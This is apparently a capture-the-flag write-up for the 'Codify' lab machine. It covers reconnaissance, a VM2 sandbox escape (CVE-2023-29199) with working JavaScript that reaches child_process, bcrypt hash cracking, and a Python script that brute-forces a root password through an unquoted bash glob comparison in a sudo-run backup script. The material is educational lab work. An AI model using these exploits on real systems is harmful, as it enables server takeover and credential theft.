# Write up
First of all, before starting to explain how has been pwned Codify, I'm going to show you all the concepts that are used to vulnerate this server:
  - An NodeJs vulnerability is exploited to gain access as user CVS (user with minimum privileges)
  - An exaustive system enumeration is needed to detect an ''.db'' file.
  - Cracking hashes.
  - Abusing SUDOERS privilege.

## Reconnaissance phase

As usual, reconnaissance phase was the first phase executed due to the fact that a hacker needs to know as much information about his target as possible before starting to exploit posible vulnerabilities.

To do this, it is necessary to add a new line in the file ''/etc/hosts'', where the server IP is defined when a request is made to codify.htb:

[![hosts.png](https://i.postimg.cc/KvyMrT1X/hosts.png)](https://postimg.cc/7bmhqf1X)

Next, Nmap is used to scan all ports on the server. The tool output is as follows:

[![Nmap.png](https://i.postimg.cc/4ySGNV78/Nmap.png)](https://postimg.cc/XBdmsZgF)

As seen in the last image, three open ports were discovered, two HTTP ports and one SSH port. The SSH port had a fairly up-to-date version, so it would be difficult to exploit this service. On the other hand, there are two http ports, so it is worth scanning the technology that is working behind both ports:

[![Scann.png](https://i.postimg.cc/qqLN1mdv/Scann.png)](https://postimg.cc/4HY4dQdD)

Practically, the output of both ports is the same, so it is likely that the same website is being exposed on both ports. For this reason, the two websites are accessed and verified to be the same.

Searching for information about the website, at "http://codify.htb/about" one discovers that it makes use of the NodeJs VM2 library. More specifically, it uses VM2 version 3.9.16:

[![VM2.png](https://i.postimg.cc/cHNCKZ0P/VM2.png)](https://postimg.cc/SXDk5BXG)

VM2 is a JavaScript library used to virtualize a sandbox on a server. In this case, this sandbox is used to run insecure code given by a user in a safe way. For this purpose, VM2 disables some global objects such as process, which allows to obtain information and control the main process.

In addition, developers restricted other modules such as 'child_process' and 'fs'. The child_process module allows to generate threads and thus execute commands on the server, and the fs module allows to interact directly with the file system.

## Exploitation phase

These restrictions can be avoided, as shown in **CVE-2023-29199**. The following code is used for this purpose:

```JavaScript
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('id');
}
```

Why are restrictions avoided with this code? Because VM2 uses the transformer() module to preprocess and modify its source code, for example, they modify the way exceptions are raised to raise sanitized exceptions with handleException().

In short, these functions use Reflect.getPrototypeOf() to get the prototype of the error object. Thus, the Proxy object can be used to throw unsanitized exceptions containing malicious code.

In addiction, as the exceptions have the ability to access the main process, so they can return an object that is not possible in the sandbox thread, and the data input is not sanitized, the attacker can run his own commands on the server.

Thanks to all concepts explained, reverse shell was created to access the server, as shown in the following image:

[![explotacion.png](https://i.postimg.cc/x8XTZHJH/explotacion.png)](https://postimg.cc/wRdpy1kT)

## Post exploitation phase
### Privilege escalation to Joshua

After gaining access to the CVS user, it is time to recognize the system. If done right, you will have found a '.db' file in "/var/www/contact". Inside it, you will find a bcrypt hash that you have to crack:

[![fichero.png](https://i.postimg.cc/tJTxDYNn/fichero.png)](https://postimg.cc/5Yhy29Gf)

Now, with the password cracked, it is possible to migrate to Joshua's account.

### Privilege escalation to root
Being Joshua, a reconnaissance of the system was done looking for something that would allow a privilege escalation to root. With a bit of luck, a file was found that can be run as root in "/opt/scripts". the script had the following content:
```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

How can the file be abused? Well, in Bash the read command does not return a string, so it is mandatory to quote the right part of line 9. Why? Because if it is not quoted it is possible to do a pattern match that will expose the root password. For example, when the script runs and asks you to enter the password, it is possible to type a "*" and avoid comparing passwords and run the whole script, as shown below:

[![Ejecucion.png](https://i.postimg.cc/HxCzYLSR/Ejecucion.png)](https://postimg.cc/mc8CVTWy)

With this concept in mind, it is possible to create a script that will dump the root password:

```python
#!/usr/bin/env python3

import sys,signal,time,subprocess,string,re

def def_handler(sig,frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

#CTRL_C
signal.signal(signal.SIGINT,def_handler)

if __name__ == "__main__":
    characters = string.ascii_letters + string.digits + "#$%&'()+,-./:;<=>?@[]^_`{|} ~"
    root_password = ""
    patron = r'Password confirmed!'

    while True:

        for character in characters:

            salida=subprocess.run('/opt/scripts/mysql-backup.sh',input=root_password+character+"*",shell=True,stdout=subprocess.PIPE,text=True)

            if re.search(patron,str(salida)):
                root_password = root_password + character
                break
        
        if character == characters[-1]:
            break

print("La contraseña es: " + root_password)
```
